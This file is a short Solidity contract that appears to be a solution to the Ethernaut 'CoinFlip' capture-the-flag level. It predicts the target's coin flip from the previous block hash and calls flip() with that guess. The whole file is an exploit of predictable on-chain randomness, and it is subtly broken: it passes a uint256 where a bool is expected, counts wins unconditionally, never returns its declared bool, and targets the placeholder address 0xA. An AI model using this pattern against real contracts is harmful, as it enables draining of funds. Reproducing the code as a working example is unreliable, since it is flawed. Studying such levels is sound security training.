// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  // ethernaut instance address
  address target = 0xA;

  constructor() public {
    consecutiveWins = 0;
  }

  function flipExploit() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    uint256 coinFlip = blockValue.div(FACTOR);
    consecutiveWins++;

    target.call(
      abi.encodeWithSignature("flip(bool)", coinFlip));
  }
}